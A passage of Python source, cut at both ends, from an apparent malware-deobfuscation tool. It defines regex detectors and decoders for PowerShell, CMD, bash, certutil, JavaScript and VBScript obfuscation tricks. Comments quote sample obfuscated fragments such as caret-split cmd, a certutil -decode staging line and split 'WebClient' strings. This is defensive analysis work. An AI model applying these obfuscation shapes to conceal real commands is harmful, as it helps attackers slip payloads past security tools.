#     Signature:  '<binary+junk>'.Split('<delims>') | ForEach-Object{
#                     [Convert]::ToInt16(([String]$_), 2|10|16) -As[Char] }
#
#     This has been available as a raw op (`ps-binary-split-decode`) for a
#     while but only worked WHEN CALLED ON THE WRAPPER TEXT. The magic
#     race stripped the wrapper via `extract-payload` FIRST, losing the
#     `.Split(...)` and `ToInt16(...,2)` metadata. Making this an archetype
#     runs the decoder against the original wrapper before extract-payload
#     can nuke it.
_PS_BINSPLIT_MARKER_RX = re.compile(
    r"ToInt16\s*\(\s*[^,]+?,\s*(?:2|10|16)\s*\)|"
    r"\[char\]\s*\[int\]\s*\(\s*['\"]?0x",
    re.IGNORECASE,
)
_PS_BINSPLIT_SPLIT_RX = re.compile(
    r"\.\s*Split\s*\(\s*['\"][^'\"]{1,32}['\"]\s*\)",
    re.IGNORECASE,
)


def _ps_binary_split_matches(text: str) -> bool:
    return (
        _PS_BINSPLIT_MARKER_RX.search(text) is not None
        and _PS_BINSPLIT_SPLIT_RX.search(text) is not None
    )


def _handle_ps_binary_split(text: str) -> str:
    from operations import run_operation
    out = run_operation("ps-binary-split-decode", text, {})
    if not isinstance(out, str) or len(out) < 3:
        raise ValueError("binary-split decode produced too little output")
    # Strip leading control-char noise (obfuscator artefacts like \x01 from
    # single-bit chunks emitted before the real payload).
    stripped = out.lstrip("".join(chr(i) for i in range(32) if i not in (9, 10, 13)))
    printable = sum(1 for c in stripped if 32 <= ord(c) < 127 or c in "\r\n\t")
    if printable / max(1, len(stripped)) < 0.60:
        raise ValueError("binary-split output not mostly printable")
    return stripped

# ============================================================================
# v2 — Feb-2026 archetype family: PowerShell string obfuscation shapes
# ============================================================================
# All these shapes recover a *token* (like "IEX", "Invoke-Expression"), NOT a
# full script layer. Their handlers return only the recovered string. The
# regex tests here are DELIBERATELY narrow — false positives on ordinary
# scripts would silently rewrite outputs.

_PS_STRING_CONCAT_RX = re.compile(
    r"(?:['\"][^'\"]{1,20}['\"]\s*\+\s*){2,}['\"][^'\"]{0,20}['\"]"
)


def _ps_string_concat_matches(text: str) -> bool:
    # At least 3 concatenated quoted literals — the typical `'Inv'+'oke'+…`
    # obfuscation. Skip long inputs (>800 chars) to avoid corrupting a real
    # multi-layer payload.
    if len(text) > 800:
        return False
    return _PS_STRING_CONCAT_RX.search(text) is not None


def _handle_ps_string_concat(text: str) -> str:
    m = _PS_STRING_CONCAT_RX.search(text)
    if not m:
        raise ValueError("no ps-string-concat span in text")
    span = m.group(0)
    parts = re.findall(r"['\"]([^'\"]*)['\"]", span)
    joined = "".join(parts)
    if not joined:
        raise ValueError("ps-string-concat parts are empty")
    # Return the FULL input with the obfuscated span replaced by the joined
    # token — analysts want to see the recovered call in situ.
    return text.replace(span, joined, 1)


_PS_JOIN_CHAR_ARRAY_RX = re.compile(
    r"\(?\s*['\"][^'\"]['\"](?:\s*,\s*['\"][^'\"]['\"]){2,}\s*\)?\s*-join\s*['\"]{2}",
)
_PS_CHAR_ARRAY_INT_RX = re.compile(
    r"\[char\[\]\]\s*\(\s*(\d{1,3}(?:\s*,\s*\d{1,3}){2,})\s*\)\s*(?:-join\s*['\"]{2})?",
    re.IGNORECASE,
)


def _ps_join_char_array_matches(text: str) -> bool:
    if len(text) > 800:
        return False
    return (
        _PS_JOIN_CHAR_ARRAY_RX.search(text) is not None
        or _PS_CHAR_ARRAY_INT_RX.search(text) is not None
    )


def _handle_ps_join_char_array(text: str) -> str:
    # Char-integer array shape first: `[char[]](73,69,88)`
    m = _PS_CHAR_ARRAY_INT_RX.search(text)
    if m:
        ints = [int(x.strip()) for x in m.group(1).split(",")]
        if not all(0 <= i <= 0xFF for i in ints):
            raise ValueError("char-array ints out of range")
        joined = "".join(chr(i) for i in ints)
        return text.replace(m.group(0), joined, 1)
    # Char-string array shape: `('I','E','X') -join ''`
    m2 = _PS_JOIN_CHAR_ARRAY_RX.search(text)
    if m2:
        span = m2.group(0)
        parts = re.findall(r"['\"]([^'\"])['\"]", span)
        joined = "".join(parts)
        if not joined:
            raise ValueError("ps-join-char-array parts empty")
        return text.replace(span, joined, 1)
    raise ValueError("no ps-join-char-array span in text")


_PS_FORMAT_OP_RX = re.compile(
    r'"((?:\{\d+\}){2,})"\s*-f\s*((?:[\'"][^\'"]*[\'"]\s*,\s*){1,}[\'"][^\'"]*[\'"])'
)


def _ps_format_op_matches(text: str) -> bool:
    if len(text) > 800:
        return False
    return _PS_FORMAT_OP_RX.search(text) is not None


def _handle_ps_format_op(text: str) -> str:
    m = _PS_FORMAT_OP_RX.search(text)
    if not m:
        raise ValueError("no ps-format-op span")
    fmt = m.group(1)
    args_str = m.group(2)
    args = re.findall(r"['\"]([^'\"]*)['\"]", args_str)
    positions = [int(p) for p in re.findall(r"\{(\d+)\}", fmt)]
    if any(p >= len(args) for p in positions):
        raise ValueError("format-op position out of range")
    joined = "".join(args[p] for p in positions)
    if not joined:
        raise ValueError("format-op result empty")
    return text.replace(m.group(0), joined, 1)


_PS_REVERSE_STRING_RX = re.compile(
    r"-join\s*\(\s*['\"]([^'\"]{3,})['\"]\s*\[\s*-1\s*\.\.\s*-\d+\s*\]\s*\)"
)
# Feb-2026 · variant used by row-0010: $c='...'; iex(($c.ToCharArray()|?{$_})[-1..-($c.Length)]-join'')
# Grabs the reversed body from the string-assignment above; falls back
# to the whole text if no assignment is found.
_PS_REVERSE_TOCHARARRAY_RX = re.compile(
    r"\$(?P<var>\w+)\s*=\s*(?P<q>['\"])(?P<body>.{6,600}?)(?P=q)"
    r"[\s\S]{0,300}?"
    r"\$(?P=var)\s*\.\s*ToCharArray\s*\(\s*\)"
    r"(?:\s*\|\s*\?\s*\{\s*\$_\s*\}\s*)?"
    r"[\s)]*"          # allow closing parens between filter and slice
    r"\[\s*-1\s*\.\.\s*-\s*\(?\s*(?:\d+|\$(?:(?P=var)\.Length))\s*\)?\s*\]"
    r"\s*-join\s*['\"]{2}",
    re.IGNORECASE,
)
# Post-resolution variant — after resolve_ps_variables() inlines the
# `$c='body'` assignment, the payload becomes `'body'.ToCharArray()...`.
# This second regex catches that shape directly.
_PS_REVERSE_TOCHARARRAY_INLINE_RX = re.compile(
    r"['\"](?P<body>.{6,600}?)['\"]\s*\.\s*ToCharArray\s*\(\s*\)"
    r"(?:\s*\|\s*\?\s*\{\s*\$_\s*\}\s*)?"
    r"[\s)]*"
    r"\[\s*-1\s*\.\.\s*-\s*\(?\s*(?:\d+|['\"][^'\"]{6,600}['\"]\.Length)\s*\)?\s*\]"
    r"\s*-join\s*['\"]{2}",
    re.IGNORECASE,
)


def _ps_reverse_string_matches(text: str) -> bool:
    if len(text) > 4000:
        return False
    return (_PS_REVERSE_STRING_RX.search(text) is not None
            or _PS_REVERSE_TOCHARARRAY_RX.search(text) is not None
            or _PS_REVERSE_TOCHARARRAY_INLINE_RX.search(text) is not None)


def _handle_ps_reverse_string(text: str) -> str:
    m = _PS_REVERSE_STRING_RX.search(text)
    if m:
        reversed_str = m.group(1)
        return text.replace(m.group(0), reversed_str[::-1], 1)
    m2 = _PS_REVERSE_TOCHARARRAY_RX.search(text)
    if m2:
        body = m2.group("body")
        # Replace the matched slice so downstream loop can't re-match the
        # same span (was causing 4x PS_REVERSE_STRING chains on row-0010).
        return text.replace(m2.group(0), body[::-1], 1)
    m3 = _PS_REVERSE_TOCHARARRAY_INLINE_RX.search(text)
    if m3:
        body = m3.group("body")
        return text.replace(m3.group(0), body[::-1], 1)
    raise ValueError("no ps-reverse-string span")


_BATCH_VAR_SLICE_SET_RX = re.compile(
    r"(?:^|\r?\n|&|@)\s*set\s+(\w+)\s*=\s*([^\r\n&]+)",
    re.IGNORECASE,
)
_BATCH_VAR_SLICE_USE_RX = re.compile(r"%(\w+):~(\d+),(\d+)%")


def _batch_var_slice_matches(text: str) -> bool:
    if len(text) > 800:
        return False
    return (
        _BATCH_VAR_SLICE_USE_RX.search(text) is not None
        and _BATCH_VAR_SLICE_SET_RX.search(text) is not None
    )


def _handle_batch_var_slice(text: str) -> str:
    # Build the variable table from every `set var=value` in the input.
    vars_: Dict[str, str] = {}
    for m in _BATCH_VAR_SLICE_SET_RX.finditer(text):
        vars_[m.group(1).strip()] = m.group(2).strip()
    if not vars_:
        raise ValueError("no batch-set assignments")
    changed = text
    for m in _BATCH_VAR_SLICE_USE_RX.finditer(text):
        name, start, length = m.group(1), int(m.group(2)), int(m.group(3))
        source = vars_.get(name)
        if source is None:
            continue
        sliced = source[start : start + length]
        if not sliced:
            continue
        changed = changed.replace(m.group(0), sliced)
    if changed == text:
        raise ValueError("batch-var-slice produced no change")
    return changed


# ─── Feb 2026: 4 new archetypes covering deterministic gaps analyst reported ─

# A. BASH_HEX_ECHO_XXD
#    echo "<hex>" | xxd -r -p | ...  OR  echo -n "<hex>" | xxd -r -p
#    Reverse-shell / IOC-hidden pattern. Extract the hex, decode to ASCII,
#    return decoded (so downstream MITRE/YARA sees the IP/host).
_BASH_HEX_XXD_RX = re.compile(
    r"echo\s+-?n?\s*['\"](?P<blob>(?:[0-9a-fA-F]{2}\s*){4,})['\"]"
    r"\s*\|\s*xxd\s+-r\s+-p",
    re.IGNORECASE,
)

def _handle_bash_hex_xxd(text: str) -> str:
    m = _BASH_HEX_XXD_RX.search(text)
    if not m:
        raise ValueError("no hex match")
    hex_str = re.sub(r"\s+", "", m.group("blob"))
    try:
        raw = bytes.fromhex(hex_str)
    except ValueError as e:
        raise ValueError(f"invalid hex: {e}")
    decoded = raw.decode("utf-8", errors="replace")
    # Re-embed the decoded IP/host into the original command so downstream
    # /dev/tcp/ MITRE + YARA + IOC extraction can pick it up.
    return text.replace(m.group(0), decoded, 1)


# B. CERTUTIL_DECODE_PEM
#    Detects a PEM-wrapped base64 blob (`-----BEGIN CERTIFICATE----- … -----END
#    CERTIFICATE-----`) *especially* when paired with certutil -decode. Decodes
#    the blob and returns the raw bytes as latin-1 so the MZ/PE header is
#    visible to downstream detectors.
_PEM_BLOB_RX = re.compile(
    r"-{5}BEGIN\s+CERTIFICATE-{5}\s*"
    r"(?P<blob>[A-Za-z0-9+/=\s]{20,})"
    r"-{5}END\s+CERTIFICATE-{5}",
    re.IGNORECASE,
)
# Detects a "staged PEM file build" sequence:
#   echo -----BEGIN CERTIFICATE----- > f.txt && echo <blob> >> f.txt && echo -----END CERTIFICATE----- >> f.txt && certutil -decode f.txt out.exe
# The BEGIN/END markers and the blob live in SEPARATE echo statements, so
# a naive contiguous-PEM regex misses them. We look for the pattern of
# `echo <b64>` sitting between BEGIN and END markers OR paired with certutil
# -decode in the same command line.
_CERTUTIL_STAGING_RX = re.compile(
    r"certutil(?:\.exe)?\s+(?:-[A-Za-z]+\s+)*-decode\b",
    re.IGNORECASE,
)
_ECHO_B64_LINE_RX = re.compile(
    r"echo\s+(?P<blob>[A-Za-z0-9+/=]{16,})\s*(?:>>|>)",
    re.IGNORECASE,
)

def _handle_certutil_decode(text: str) -> str:
    """Return `<original text>\n\n[CERTUTIL PAYLOAD DECODED]\n<decoded>`."""
    blob = None
    m = _PEM_BLOB_RX.search(text)
    if m:
        blob = re.sub(r"\s+", "", m.group("blob"))
    if not blob:
        # Staged form: certutil -decode present → pick the largest `echo <b64>`
        # line as the payload blob (skipping PEM header/footer lines).
        if _CERTUTIL_STAGING_RX.search(text):
            candidates = [
                m2.group("blob") for m2 in _ECHO_B64_LINE_RX.finditer(text)
            ]
            # Reject anything that looks like PEM boilerplate (BEGIN/END caught
            # by another regex, but a bare `certificate` word would too).
            candidates = [c for c in candidates
                          if not re.fullmatch(r"[A-Z]+", c) and len(c) >= 20]
            if candidates:
                blob = max(candidates, key=len)
    if not blob:
        raise ValueError("no PEM/certutil blob")
    raw = robust_b64decode(blob)

    # ── Forensic-grade hexdump view ─────────────────────────────────────
    # Analyst asked for: rows of 16 bytes, `xx xx xx …` grouped in 8+8, right
    # column ASCII sidebar with `.` for non-printable. Cap at 128 bytes so
    # the report stays scannable — the full raw bytes are decoded regardless.
    def _hexdump(b: bytes, limit: int = 128) -> str:
        rows = []
        for off in range(0, min(len(b), limit), 16):
            chunk = b[off:off + 16]
            hex_left  = " ".join(f"{c:02x}" for c in chunk[:8])
            hex_right = " ".join(f"{c:02x}" for c in chunk[8:16])
            ascii_col = "".join(
                chr(c) if 32 <= c < 127 else "." for c in chunk
            )
            rows.append(f"  {off:08x}  {hex_left:<23}  {hex_right:<23}  |{ascii_col}|")
        if len(b) > limit:
            rows.append(f"  … {len(b) - limit} more bytes …")
        return "\n".join(rows)

    # ── PE / MZ header classifier ──────────────────────────────────────
    is_pe = raw[:2] == b"MZ"
    header_summary = "unknown / opaque binary blob"
    if is_pe:
        header_summary = "PE (MZ) executable — staged for later execution via certutil -decode"
    elif raw[:4] == b"\x7fELF":
        header_summary = "ELF binary (Linux executable)"
    elif raw[:4] == b"\xca\xfe\xba\xbe":
        header_summary = "Mach-O / Java class file"
    elif raw[:2] == b"PK":
        header_summary = "ZIP / Office container"

    return (
        text
        + "\n\n"
        + "════════════════════════════════════════════════════════════════════\n"
        + "  CERTUTIL / PEM PAYLOAD — DETERMINISTIC DECODE\n"
        + "════════════════════════════════════════════════════════════════════\n"
        + f"  Base64 length : {len(blob)} chars\n"
        + f"  Decoded size  : {len(raw)} bytes\n"
        + f"  File type     : {header_summary}\n"
        + f"  Magic bytes   : {raw[:8].hex(' ') if len(raw) >= 8 else raw.hex(' ')}\n"
        + f"  MITRE         : T1140 (Deobfuscate/Decode) · T1218 (Signed Binary Proxy Execution) · T1027 (Obfuscated Files)\n"
        + f"  LOLBAS        : certutil.exe abused for payload decoding\n"
        + "  ── HEXADECIMAL VIEW (raw bytes) ────────────────────────────────\n"
        + _hexdump(raw)
        + "\n  ── ASCII VIEW ──────────────────────────────────────────────────\n"
        + "  "
        + "".join(chr(c) if 32 <= c < 127 else "." for c in raw[:128])
        + ("" if len(raw) <= 128 else f"\n  … {len(raw) - 128} more bytes truncated …")
        + "\n════════════════════════════════════════════════════════════════════\n"
    )


# C. BASH_PARAM_EXP_SLICE
#    Resolves `${VAR:x:y}` substring expansion using canonical Linux env
#    values. Deterministic — same PATH/SHELL every time. Common defensive
#    obfuscation: `${SHELL:0:1}a${PATH:11:1}h -c ...`
_BASH_PARAM_EXP_RX = re.compile(r"\$\{(?P<var>\w+):(?P<start>\d+):(?P<len>\d+)\}")
# Canonical Debian/Ubuntu env values — used as the default resolution.
_CANONICAL_ENV = {
    "PATH":  "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "SHELL": "/bin/bash",
    "HOME":  "/root",
    "USER":  "root",
    "IFS":   " \t\n",
    "PWD":   "/root",
    "HOSTNAME": "localhost",
    "LANG":  "en_US.UTF-8",
}

def _handle_bash_param_exp(text: str) -> str:
    """Substitute every `${VAR:x:y}` with the character(s) from canonical env."""
    def _sub(m: "re.Match[str]") -> str:
        var = m.group("var")
        start = int(m.group("start"))
        length = int(m.group("len"))
        val = _CANONICAL_ENV.get(var)
        if val is None:
            return m.group(0)  # leave untouched — unknown var
        return val[start:start + length]

    resolved = _BASH_PARAM_EXP_RX.sub(_sub, text)
    if resolved == text:
        raise ValueError("no ${VAR:x:y} matches resolved")
    return resolved


# D. CMD_FORLOOP_REVERSE_STRING
#    set "p=<junk>" && for /L %i in (N,-1,0) do <nul set /p "c=!p:~%i,1!"
#    Reverses the string in `p` character-by-character. Classic Emotet/
#    QakBot / IcedID obfuscation. Handler reverses `p` and returns the
#    original text with the reversed value substituted in.
_CMD_FORLOOP_REV_RX = re.compile(
    r"set\s+[\"']?p\s*=\s*(?P<val>[^\"'\r\n]{4,})[\"']?"
    r"[\s\S]{0,120}?"
    r"for\s*/L\s+%\w\s+in\s*\(\s*(?P<start>\d+)\s*,\s*-1\s*,\s*0\s*\)\s+do\s+"
    r"<nul\s+set\s+/p\s+[\"']?c\s*=\s*!p:~%\w,1!",
    re.IGNORECASE,
)

def _handle_cmd_forloop_reverse(text: str) -> str:
    m = _CMD_FORLOOP_REV_RX.search(text)
    if not m:
        raise ValueError("no CMD reverse-forloop match")
    junk = m.group("val")
    revealed = junk[::-1]
    return (
        text
        + "\n\n[CMD FOR-LOOP REVERSE-STRING RESOLVED]\n"
        + f"reversed_p={revealed!r}\n"
    )


# E. CMD_CARET_OBFUSC — c^m^d^ /c wh^oami  (Emotet/Trickbot classic)
# Must require a CMD-shaped context so we don't false-fire on binary
# payloads that happen to contain `^X^Y` byte sequences.
_CMD_CARET_OBFUSC_RX = re.compile(
    r"(?:^|[\s&|;]|/[cvk])"                    # CMD boundary
    r"(?:[a-zA-Z]\^){2,}[a-zA-Z]"              # letter^letter^letter (≥3 letters)
    r"|"
    r"\bc\^m\^d\b"                             # explicit `c^m^d`
    r"|"
    r"\^[a-zA-Z](?:\^[a-zA-Z]){2,}",           # ^X^Y^Z^W
    re.IGNORECASE,
)

def _handle_cmd_caret_obfusc(text: str) -> str:
    # CMD treats `^X` as literal `X` for ANY non-newline `X`. Only carets
    # at end-of-line are line-continuations and must be preserved.
    cleaned = re.sub(r"\^(?=[^\r\n])", "", text)
    if cleaned == text:
        raise ValueError("no caret-obfusc to strip")
    return cleaned


# F. JS_BUFFER_GUNZIP — Buffer.from('<b64>','base64') → zlib.gunzipSync(...)
_JS_BUFFER_GUNZIP_RX = re.compile(
    r"require\s*\(\s*['\"]zlib['\"]\s*\)\.gunzipSync\s*\(\s*"
    r"Buffer\.from\s*\(\s*['\"](?P<blob>[A-Za-z0-9+/=_\-]{16,})['\"]\s*,"
    r"\s*['\"]base64['\"]\s*\)\s*\)",
    re.IGNORECASE,
)
# Also a looser form: Buffer.from(<b64>, 'base64') followed by gunzip anywhere
_JS_BUFFER_GUNZIP_LOOSE_RX = re.compile(
    r"Buffer\.from\s*\(\s*['\"](?P<blob>[A-Za-z0-9+/=_\-]{16,})['\"]"
    r"\s*,\s*['\"]base64['\"]\s*\)[\s\S]{0,300}?gunzip",
    re.IGNORECASE,
)

def _handle_js_buffer_gunzip(text: str) -> str:
    m = _JS_BUFFER_GUNZIP_RX.search(text) or _JS_BUFFER_GUNZIP_LOOSE_RX.search(text)
    if not m:
        raise ValueError("no JS Buffer.gunzip match")
    blob = m.group("blob")
    try:
        return robust_b64_then_gunzip(blob)
    except Exception:
        # blob is base64 but not gzipped — return the raw b64-decoded bytes
        raw = robust_b64decode(blob)
        return raw.decode("utf-8", errors="replace")


# G. VBS_CHR_CONCAT — Chr(72) & Chr(101) & Chr(108) & …  (VBScript macros)
_VBS_CHR_CONCAT_RX = re.compile(
    r"(?:Chr[WwBb]?\s*\(\s*(?:&H)?\d+\s*\)\s*(?:&|\+)\s*){2,}"
    r"Chr[WwBb]?\s*\(\s*(?:&H)?\d+\s*\)",
    re.IGNORECASE,
)
_VBS_CHR_CALL_RX = re.compile(r"Chr[WwBb]?\s*\(\s*(?:&H)?(\d+)\s*\)", re.IGNORECASE)

def _handle_vbs_chr_concat(text: str) -> str:
    m = _VBS_CHR_CONCAT_RX.search(text)
    if not m:
        raise ValueError("no VBS Chr concat match")
    chunk = m.group(0)
    codes = [int(x) for x in _VBS_CHR_CALL_RX.findall(chunk)]
    decoded = "".join(chr(c) for c in codes if 0 <= c < 0x10FFFF)
    return text.replace(chunk, decoded, 1)


# ─── Feb 2026 · Research-Backed Archetypes ──────────────────────────────
# Sources:
#   • Bohannon & Holmes, BlackHat US 2017 (Revoke-Obfuscation)
#   • Deep Instinct, "Excel(ent) Obfuscation: Regex Gone Rogue" (May 2025)
#   • dr4k0nia, "String Obfuscation The Malware Way" (Dec 2022)
# See /app/memory/RESEARCH_REFERENCES.md
# ─────────────────────────────────────────────────────────────────────────

# --- H. PS_TICK_OBFUSC  (Bohannon) --------------------------------------
# Shape: `D`o`w`n`l`o`a`d`S`t`r`i`n`g   or   `I`E`X   or   `N`e`w`-`O`b`j`e`c`t
# Backtick between every char is a purely-cosmetic PS escape → strip them.
_PS_TICK_OBFUSC_RX = re.compile(
    r"(?:`[A-Za-z\-]){3,}"
)

def _ps_tick_obfusc_matches(text: str) -> bool:
    return bool(_PS_TICK_OBFUSC_RX.search(text))

def _handle_ps_tick_obfusc(text: str) -> str:
    changed = False
    def repl(m: "re.Match[str]") -> str:
        nonlocal changed
        stripped = m.group(0).replace("`", "")
        if stripped != m.group(0):
            changed = True
        return stripped
    out = _PS_TICK_OBFUSC_RX.sub(repl, text)
    if not changed:
        raise ValueError("no ps-tick spans")
    return out


# --- I. CMD_ENVVAR_SPLIT_POWERSHELL  (Bohannon FIN8) --------------------
# set p1=power && set p2=shell && cmd /c echo <PS> ^| %p1%%p2% -
# Resolve chained %var% concatenation from `set NAME=VALUE` pairs.
_CMD_ENV_SET_RX = re.compile(
    r"set\s+([A-Za-z_][A-Za-z0-9_]*)=([^&\r\n\"]+?)(?=\s*(?:&&?|\r|\n|$))",
    re.IGNORECASE,
)
_CMD_ENV_USE_RX = re.compile(r"%([A-Za-z_][A-Za-z0-9_]*)%")

def _cmd_envvar_split_matches(text: str) -> bool:
    if len(text) > 4000:
        return False
    sets = _CMD_ENV_SET_RX.findall(text)
    if len(sets) < 2:
        return False
    names = {n.lower() for n, _ in sets}
    uses = {u.lower() for u in _CMD_ENV_USE_RX.findall(text)}
    joined = " ".join(v for _, v in sets).lower()
    return bool(names & uses) and any(
        tok in joined for tok in ("power", "shell", "cmd", "iex", "cert", "bit")
    )

def _handle_cmd_envvar_split(text: str) -> str:
    vars_: Dict[str, str] = {n: v.strip() for n, v in _CMD_ENV_SET_RX.findall(text)}
    if not vars_:
        raise ValueError("no cmd env sets")
    def replace_uses(s: str) -> str:
        # Substitute %var% up to 3 passes so chained concats resolve fully
        for _ in range(3):
            new = _CMD_ENV_USE_RX.sub(
                lambda m: vars_.get(m.group(1), m.group(0)),
                s,
            )
            if new == s:
                break
            s = new
        return s
    resolved = replace_uses(text)
    if resolved == text:
        raise ValueError("no env-var expansion")
    return resolved


# --- J. PS_GET_COMMAND_WILDCARD  (Bohannon) -----------------------------
# & (GCM *w-O*)  ,  . (Get-Command *ew-O*)  → obfuscated New-Object.
# We flag the intent by annotating a comment. Very high-signal detector.
_PS_GCM_WILDCARD_RX = re.compile(
    r"(?:[&.]\s*\(\s*(?:GCM|Get-Command|Command|GAL|Get-Alias|Alias)\s+"
    r"['\"]?\*?[A-Za-z\-]{2,}[\-*][A-Za-z\-]{0,}\*?['\"]?\s*\))",
    re.IGNORECASE,
)

_PS_GCM_TARGET_HINTS = {
    "w-o": "New-Object",
    "ew-o": "New-Object",
    "new-o": "New-Object",
    "n-o": "New-Object",
    "iex": "Invoke-Expression",
    "i-e": "Invoke-Expression",
    "voke-e": "Invoke-Expression",
    "voke-c": "Invoke-Command",
}

def _ps_gcm_wildcard_matches(text: str) -> bool:
    return bool(_PS_GCM_WILDCARD_RX.search(text))

def _handle_ps_gcm_wildcard(text: str) -> str:
    hits = _PS_GCM_WILDCARD_RX.findall(text)
    if not hits:
        raise ValueError("no gcm-wildcard match")
    annotations = []
    for span in hits:
        low = span.lower()
        target = "Get-Command wildcard"
        for pat, name in _PS_GCM_TARGET_HINTS.items():
            if pat in low:
                target = name
                break
        annotations.append(f"[NIVX_DEOBFUSC] {span}  →  {target}")
    banner = "\n".join(annotations)
    return f"{text}\n\n# --- Bohannon Wildcard-Cmdlet Deobfuscation ---\n{banner}"


# --- K. PS_SPLIT_JOIN_DELIM  (Bohannon) ---------------------------------
# "(New-Object Net.We~~bClient)".Split("~~") -Join ''
# $c=<STRING>; ($c.Split("~~") -Join '')  ← multi-statement form
_PS_SPLIT_JOIN_INLINE_RX = re.compile(
    r"(?:['\"](?P<body>[^'\"]{8,400}?)['\"]|\$\w+)\s*"
    r"(?:\.\s*Split\s*\(\s*['\"](?P<delim>[^'\"]{1,6})['\"]\s*\)"
    r"|\s*-Split\s*['\"](?P<delim2>[^'\"]{1,6})['\"])"
    r"\s*(?:-Join|\.Join)\s*['\"]{2}",
    re.IGNORECASE,
)
# String-assignment form: $c = "<body>" ... $c.Split("~~") -Join ''
_PS_SPLIT_JOIN_ASSIGN_RX = re.compile(
    r"\$(?P<var>\w+)\s*=\s*(?P<q>['\"])(?P<body>.{8,400}?)(?P=q)"
    r"[\s\S]{0,200}?"
    r"\$(?P=var)(?:\.\s*Split\s*\(\s*['\"](?P<delim>[^'\"]{1,6})['\"]\s*\)"
    r"|\s*-Split\s*['\"](?P<delim2>[^'\"]{1,6})['\"])"
    r"\s*(?:-Join|\.Join)\s*['\"]{2}",
    re.IGNORECASE,
)

def _ps_split_join_matches(text: str) -> bool:
    return bool(
        _PS_SPLIT_JOIN_INLINE_RX.search(text)
        or _PS_SPLIT_JOIN_ASSIGN_RX.search(text)
    )

def _handle_ps_split_join(text: str) -> str:
    m = _PS_SPLIT_JOIN_ASSIGN_RX.search(text) or _PS_SPLIT_JOIN_INLINE_RX.search(text)
    if not m:
        raise ValueError("no split-join match")
    body = m.groupdict().get("body") or ""
    delim = m.groupdict().get("delim") or m.groupdict().get("delim2") or ""
    if not body or not delim:
        raise ValueError("empty body/delim")
    cleaned = body.replace(delim, "")
    return f"{text}\n\n# --- Split-Join Deobfuscation (Bohannon) ---\n{cleaned}"


# --- L. PS_REPLACE_JUNK  (Bohannon) -------------------------------------
# "<body>".Replace("~~","")  |  -Replace "~~",""  |  $c.Replace("~~","")
_PS_REPLACE_JUNK_INLINE_RX = re.compile(
    r"(?:['\"](?P<body>[^'\"]{8,400}?)['\"]|\$\w+)\s*"
    r"(?:\.\s*Replace\s*\(\s*['\"](?P<delim>[^'\"]{1,6})['\"]\s*,\s*['\"]{2}\s*\)"
    r"|\s*-c?Replace\s+['\"](?P<delim2>[^'\"]{1,6})['\"]\s*,\s*['\"]{2})",
    re.IGNORECASE,
)
_PS_REPLACE_JUNK_ASSIGN_RX = re.compile(
    r"\$(?P<var>\w+)\s*=\s*(?P<q>['\"])(?P<body>.{8,400}?)(?P=q)"
    r"[\s\S]{0,200}?"
    r"\$(?P=var)(?:\.\s*Replace\s*\(\s*['\"](?P<delim>[^'\"]{1,6})['\"]\s*,\s*['\"]{2}\s*\)"
    r"|\s*-c?Replace\s+['\"](?P<delim2>[^'\"]{1,6})['\"]\s*,\s*['\"]{2})",
    re.IGNORECASE,
)

def _ps_replace_junk_matches(text: str) -> bool:
    # Skip if this is actually a dr4k0nia homoglyph payload (Cyrillic chars
    # inside the .Replace() delimiter) — DOTNET_HOMOGLYPH_REPLACE handles it.
    if _HOMOGLYPH_RX.search(text):
        return False
    return bool(
        _PS_REPLACE_JUNK_INLINE_RX.search(text)
        or _PS_REPLACE_JUNK_ASSIGN_RX.search(text)
    )

def _handle_ps_replace_junk(text: str) -> str:
    m = _PS_REPLACE_JUNK_ASSIGN_RX.search(text) or _PS_REPLACE_JUNK_INLINE_RX.search(text)
    if not m:
        raise ValueError("no replace-junk match")
    body = m.groupdict().get("body") or ""
    delim = m.groupdict().get("delim") or m.groupdict().get("delim2") or ""
    if not body or not delim:
        raise ValueError("empty body/delim")
    cleaned = body.replace(delim, "")
    return f"{text}\n\n# --- Replace-Junk Deobfuscation (Bohannon) ---\n{cleaned}"


# --- M. PS_ARRAY_REVERSE_JOIN  (Bohannon) -------------------------------
# $c = "reversedString".ToCharArray(); [Array]::Reverse($c); ($c -Join '')
_PS_ARRAY_REVERSE_JOIN_RX = re.compile(
    r"['\"](?P<body>[^'\"]{6,400}?)['\"]\s*\.\s*ToCharArray\s*\(\s*\)"
    r"[\s\S]{0,120}?\[Array\]\s*::\s*Reverse",
    re.IGNORECASE,
)

def _ps_array_reverse_join_matches(text: str) -> bool:
    return bool(_PS_ARRAY_REVERSE_JOIN_RX.search(text))

def _handle_ps_array_reverse_join(text: str) -> str:
    m = _PS_ARRAY_REVERSE_JOIN_RX.search(text)
    if not m:
        raise ValueError("no array-reverse match")
    body = m.group("body")
    rev = body[::-1]
    return f"{text}\n\n# --- [Array]::Reverse Deobfuscation ---\n{rev}"


# --- N. PS_REGEX_REVERSE  (Bohannon) ------------------------------------
# -Join [RegEx]::Matches("body",'.','RightToLeft')
# Body may contain single quotes → separately match single- vs double-quoted body.
_PS_REGEX_REVERSE_DQ_RX = re.compile(
    r"\[RegEx\]::Matches\s*\(\s*\"(?P<body>[^\"]{6,600})\"\s*,\s*"
    r"['\"]\.['\"]\s*,\s*['\"]RightToLeft['\"]",
    re.IGNORECASE,
)
_PS_REGEX_REVERSE_SQ_RX = re.compile(
    r"\[RegEx\]::Matches\s*\(\s*'(?P<body>[^']{6,600})'\s*,\s*"
    r"['\"]\.['\"]\s*,\s*['\"]RightToLeft['\"]",
    re.IGNORECASE,
)

def _ps_regex_reverse_matches(text: str) -> bool:
    return bool(
        _PS_REGEX_REVERSE_DQ_RX.search(text)
        or _PS_REGEX_REVERSE_SQ_RX.search(text)
    )

def _handle_ps_regex_reverse(text: str) -> str:
    m = _PS_REGEX_REVERSE_DQ_RX.search(text) or _PS_REGEX_REVERSE_SQ_RX.search(text)
    if not m:
        raise ValueError("no regex-reverse match")
    body = m.group("body")
    return f"{text}\n\n# --- [RegEx]::Matches RightToLeft Reversal (Bohannon) ---\n{body[::-1]}"


# --- O. PS_SCRIPTBLOCK_CREATE  (Bohannon) -------------------------------
# [Scriptblock]::Create("<code>")  — body may contain single quotes
_PS_SB_CREATE_DQ_RX = re.compile(
    r"\[(?:ScriptBlock|Scriptblock|SCRIPTBLOCK)\]::Create\s*\(\s*"
    r"\"(?P<body>[^\"]{4,800})\"\s*\)",
    re.IGNORECASE,
)
_PS_SB_CREATE_SQ_RX = re.compile(
    r"\[(?:ScriptBlock|Scriptblock|SCRIPTBLOCK)\]::Create\s*\(\s*"
    r"'(?P<body>[^']{4,800})'\s*\)",
